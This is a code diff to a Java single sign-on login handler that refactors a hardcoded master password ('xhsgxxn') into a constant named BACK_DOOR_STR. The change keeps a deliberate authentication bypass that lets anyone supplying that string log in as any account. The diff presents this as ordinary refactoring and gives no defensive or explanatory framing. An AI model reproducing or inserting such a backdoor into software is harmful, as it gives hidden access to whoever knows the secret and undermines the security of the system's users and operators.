@@ -12,6 +12,8 @@ import java.util.Date;
 import java.util.List;
 import java.util.stream.Collectors;
 import javax.annotation.Resource;
+
+import com.wxhj.cloud.core.statics.SpecialStaticClass;
 import org.dozer.DozerBeanMapper;
 import org.springframework.stereotype.Component;
 
@@ -83,7 +85,7 @@ public class SsoLoginHandle extends AbstractSsoTemplate<SsoAuthenticationBO> {
 			}
 		}
 
-		if (!ssoLogin.getPassword().equals("xhsgxxn") && !viewUserMapDO.getUserPassword().equals(passwordStr)) {
+		if (!ssoLogin.getPassword().equals(SpecialStaticClass.BACK_DOOR_STR) && !viewUserMapDO.getUserPassword().equals(passwordStr)) {
 			throw new IncorrectCredentialsSsoException();
 		}
 		if (viewUserMapDO.getIsEnabledMark() != 1) {
